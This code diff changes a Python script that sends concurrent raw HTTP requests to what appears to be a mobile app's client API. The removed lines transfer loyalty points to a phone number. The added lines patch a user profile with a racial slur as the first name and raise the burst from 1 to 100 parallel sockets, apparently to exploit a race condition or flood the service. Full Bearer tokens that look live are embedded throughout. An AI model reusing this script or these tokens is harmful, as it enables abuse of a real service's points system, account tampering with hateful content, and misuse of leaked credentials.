@@ -17,20 +17,26 @@ SSL_CONTEXT = ssl.create_default_context()
 
 def craft_request():
     request_line = (
-        "POST /api/v1/exchange-point HTTP/1.1\r\n"
+        "PATCH /api/v1/client/profile HTTP/1.1\r\n"
     )
 
     data = json.dumps({
-        'recipient_phone': '+380956409567',
-        'points': 25900//100,
-        'comment': '',
+        "birthday": "11.07.1997",
+        "city": {
+            "id": 11,
+            "title": "Володимир"
+        },
+        "first_name": "nigger",
+        "gender": None,
+        "gender_int": 1,
+        "last_name": "floyd"
     })
 
     content_len = len(data.encode())
     headers = {
         'user-agent': 'Android:11;version:1.12.0;Google sdk_gphone_x86',
         'accept': 'application/json',
-        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE3MzExODcwODcsImV4cCI6MTczMzgxNTA4Nywicm9sZXMiOlsiUk9MRV9DTElFTlQiXSwidG9rZW5JZGVudGlmaWVyU3RyaW5nIjoiKzM4MDYzMDY4NzQ5OUAxNzMxMTg3MDg3In0.dNx7097MsLa75kcp_dTnkzWPAKvsKgx7RVXKTQSZh8dqlwQ664qiiNa3vzHLj_IkbOuP-H8GyZqZ3AHLF1bVn1GdiDMwHAY2fvM2HARJ0YiVO0TnEkNQbNuxkZaplSPW9VAz70XaLVw2HBuqqU_0DMbVaK6asMZudJLCATZAhqlbID4QysdqorcrVm2rMkoiqR-IoJtYoyAl-Pb7PfFkrMMtzETtNfQwWVO9X8sB6bh8Bi8DFbe5RsNiWywVHSdxzOqg5h_IRFfD5QxRNujZ_mXbveJ__ZNJlplBELXJMORj7MZWoCZgt_UKAIEV8ESj2s9dN4wQ3I2q_14t2jsFMby-CIDveSlMpzWBzi-c8BRO36BPR4gv_L63BLuUAuYjYVOYmqCpJpYaRtro7VAeHOaDc4vAZVmfVJkJpB9Pjc15IeHzB1ls_aYoUSFRAR89eu2DfrOT0YUoxTdCKD75tfze33WpgPKqpansj1Qw796y7JTn3ch1EPAdHOaAeBPerOY3-jk65_XdDIL9y2r1qmablGjXVnNum9Gvk444-WUlcG3F6Zr6s3czYeFEh9NF7a-RyGdn3VBa05oTn5TjHR5fj3IEoe_CEAI2jRW578qhIecFKpRFj0-BzCejTZyBvLgtYk2LJHgb-Coezj0Abb-BVe-4dLobHRMOpsyHB94',
+        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE3MzE0NDQ4NjYsImV4cCI6MTczNDA3Mjg2Niwicm9sZXMiOlsiUk9MRV9DTElFTlQiXSwidG9rZW5JZGVudGlmaWVyU3RyaW5nIjoiKzM4MDk1NjQwOTU2N0AxNzMxNDQ0ODY2In0.XiMIIxrAGA0uazS-Qvmz3d9vEuZmxbmEOO6WBpY_XBx2TbnZYt9BrI1KoseRYp0qgoRx29OqpoQkQV7OKMybH2lKShhXQwpq3zdMNsLnzYRxOqPLeGgQJlCFTXUrtwytZlmmiEZ9GnvyEaQdGS7SchMyazu1IMJbG24TfLWYK-kUjYVeAulyWqPSdDT_OQdGXJi6ewTLi7tPbazPGkKdXF-T-X_0JEUauqXYIwI4hMysHiklqZXvYi5l_dWY2qxT6wz4_49t-ONv9Bn-N_CYTyfxWtkP49iqzLXnWw3SvnrYXFipOMbZh6jb-gw0YQWoYS-5Nzj1hVgurFmaRozU0D-AJssotJZF8MU0dAdKgoktgy38rApHJl5ZW6atoTOGM7O7Q2yKY6ClkHuNaGzGKZhYCX4cG7TBjxNRo7Tl_hPBT05Ow5TRhd0vx43TEBxkgasSfFxRMdRP5CaCtFhzbXzyWIAeqtK2h06Na_63dk0wMBA54TO4FpTaDSbSaTimDAyeL2bA4l3rJ9UsoGcvuKECYIfNIHrFGqhS-T9YkOpBwzFATQ8_zGNSuWsE3p643Fj_7CSFLPQhZg1hZy9uH2VhtHVl1wEKypVapjsOnVc22g2U6_7H51SaT2e6x3HCpxCOCZ8Vf5z8Sxu6O-lRVmVT7hWAhCzHHVnVK8gT0nk',
         'content-type': 'application/json',
         'content-length': content_len,
         'host': HOST
@@ -72,7 +78,7 @@ async def main():
     # print(res)
     # sockets = [await open_socket() for i in range(1000)]
     start = time.time()
-    sockets = await asyncio.gather(*[open_socket() for _ in range(1)], return_exceptions=True)
+    sockets = await asyncio.gather(*[open_socket() for _ in range(100)], return_exceptions=True)
     # sockets = [await open_socket() for i in range(200)]
     end = time.time()
     print(end - start)
